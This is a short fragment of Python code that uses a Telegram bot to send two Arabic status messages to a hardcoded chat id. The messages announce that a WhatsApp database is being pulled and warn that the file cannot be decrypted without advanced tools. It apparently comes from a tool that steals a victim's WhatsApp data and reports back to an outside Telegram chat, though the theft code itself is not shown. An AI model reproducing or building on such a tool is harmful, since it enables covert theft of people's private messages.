...
bot.send_message(chat_id=5198984934, text= 'جاري سحب قاعدة بيانات واتساب 🔥☠️')
bot.send_message(chat_id=5198984934, text= 'ملاحظة: لا يمكنك فك تشفير هذا الملف الا بأدوات متقدمة جدا وقد تكون مدفوعة 🚫')
